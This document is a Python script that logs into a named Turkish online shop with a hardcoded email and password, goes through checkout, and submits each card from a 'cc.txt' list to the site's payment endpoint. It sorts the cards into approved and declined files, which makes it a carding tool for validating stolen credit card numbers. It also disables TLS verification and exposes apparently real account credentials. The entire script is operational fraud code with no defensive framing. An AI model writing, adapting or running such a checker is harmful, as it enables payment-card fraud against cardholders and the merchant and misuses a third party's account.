import sys, os, re, json, urllib.parse
try:
    import requests
except:
    os.system(f"{sys.executable} -m pip install requests")
    import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
BASE = "https://www.happy.com.tr"

def ext(txt, s, e):
    try:
        if s in txt: return txt.split(s,1)[1].split(e,1)[0]
        return ""
    except: return ""

combo_mail = "sercankatirci@hotmail.com"
combo_pass = "h123456789"
cc_file = "cc.txt"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA, "Accept-Language": "tr-TR,tr;q=0.9"})

r = s.get(BASE + "/index.php?route=account/login", timeout=15)
csrf = ext(r.text, 'name="csrfToken" value="', '"')
r = s.post(BASE + "/index.php?route=account/login",
    headers={"content-type": "application/x-www-form-urlencoded", "origin": BASE, "referer": BASE + "/index.php?route=account/login"},
    data=f"email={urllib.parse.quote(combo_mail)}&password={urllib.parse.quote(combo_pass)}&csrfToken={urllib.parse.quote(csrf)}", timeout=15, allow_redirects=False)
if 'location' not in r.headers:
    print(f"[!] Login failed (status {r.status_code}) — wrong credentials or site issue")
    sys.exit(1)
loc = r.headers['location']
s.get(loc if loc.startswith('http') else BASE + loc, timeout=15)

# Check and clear cart first, then add product
r = s.get(BASE + "/index.php?route=checkout/cart", timeout=15)
existing = re.findall(r'name="quantity\[(\d+)\]"', r.text)
for pid in existing:
    s.get(BASE + f"/index.php?route=checkout/cart&remove={pid}", timeout=15)

s.post(BASE + "/index.php?route=checkout/cart/add",
    headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": BASE, "x-requested-with": "XMLHttpRequest"},
    data="quantity=1&product_id=137515", timeout=15)

r = s.get(BASE + "/index.php?route=checkout/checkout", timeout=15, allow_redirects=False)
if r.status_code == 302:
    print("[!] checkout redirected, product may be out of stock")
    sys.exit(1)

r = s.get(BASE + "/index.php?route=checkout/payment_address",
    headers={"x-requested-with": "XMLHttpRequest", "referer": BASE + "/index.php?route=checkout/checkout"}, timeout=15)

addr_ids = re.findall(r'<option[^>]*value="(\d+)"', r.text)
addr_id = addr_ids[0] if addr_ids else ""

r = s.post(BASE + "/index.php?route=checkout/payment_address/validate",
    headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": BASE, "referer": BASE + "/index.php?route=checkout/checkout", "x-requested-with": "XMLHttpRequest"},
    data=f"payment_address=existing&address_id={addr_id}&country_id=215&same-payment-address=1&tckimlikvergi=", timeout=15)

if r.text.strip() in ("[]",):
    pass
elif "redirect" in r.text:
    print(f"[!] address validate failed: {r.text[:100]}")
    sys.exit(1)

r = s.get(BASE + "/index.php?route=checkout/shipping_method",
    headers={"x-requested-with": "XMLHttpRequest", "referer": BASE + "/index.php?route=checkout/checkout"}, timeout=15)

ship_match = re.search(r'value="([^"]+)"[^>]*checked', r.text)
if not ship_match:
    ship_match = re.search(r'name="shipping_method"[^>]*value="([^"]+)"', r.text)
if not ship_match:
    print("[!] shipping method not found")
    sys.exit(1)
ship_code = ship_match.group(1)

s.post(BASE + "/index.php?route=checkout/shipping_method/validate",
    headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": BASE, "referer": BASE + "/index.php?route=checkout/checkout", "x-requested-with": "XMLHttpRequest"},
    data=f"shipping_method={urllib.parse.quote(ship_code)}&comment=", timeout=15)

s.get(BASE + "/index.php?route=checkout/payment_method",
    headers={"x-requested-with": "XMLHttpRequest", "referer": BASE + "/index.php?route=checkout/checkout"}, timeout=15)

s.post(BASE + "/index.php?route=checkout/payment_method/validate",
    headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": BASE, "referer": BASE + "/index.php?route=checkout/checkout", "x-requested-with": "XMLHttpRequest"},
    data="payment_method=creditcard&comment=", timeout=15)

r = s.get(BASE + "/index.php?route=checkout/confirm",
    headers={"x-requested-with": "XMLHttpRequest", "referer": BASE + "/index.php?route=checkout/checkout"}, timeout=15)
csrf_token = ext(r.text, 'csrfToken" value="', '"') or ext(r.text, 'name="csrfToken" value="', '"')

if not csrf_token:
    print("[!] csrfToken could not be obtained")
    sys.exit(1)

with open(cc_file) as f:
    lines = [l.strip() for l in f if l.strip()]

approved = []
declined = []

for line in lines:
    p = line.split("|")
    if len(p) < 4: continue
    card, mm, yy, cvv = p[0], p[1], p[2], p[3]
    yy = yy[-2:] if len(yy) > 2 else yy

    data = f"banka=garanti&cardtype=1&cardname=bonus&cc_number={card}&cc_month={mm}&cc_year={yy}&cc_cvv={cvv}&csrfToken={urllib.parse.quote(csrf_token)}"
    r = s.post(BASE + "/index.php?route=payment/creditcard/checkPoint",
        headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": BASE, "referer": BASE + "/index.php?route=checkout/confirm", "x-requested-with": "XMLHttpRequest"},
        data=data, timeout=15)

    try:
        j = r.json()
    except:
        print(f"#ParseError {card}|{mm}|{yy}|{cvv}")
        declined.append(line)
        continue

    if isinstance(j, dict) and not j.get("error"):
        amount = j.get("amount", "0")
        if float(amount) > 0:
            print(f"#Approved {card}|{mm}|{yy}|{cvv} Puan = {amount}")
            approved.append(line)
        else:
            print(f"#Declined {card}|{mm}|{yy}|{cvv} Puan = 0")
            declined.append(line)
    else:
        err_msg = j.get("error", "unknown") if isinstance(j, dict) else str(j)
        print(f"#Declined {card}|{mm}|{yy}|{cvv} {err_msg}")
        declined.append(line)

with open("approved.txt", "w") as f: f.write("\n".join(approved))
with open("declined.txt", "w") as f: f.write("\n".join(declined))
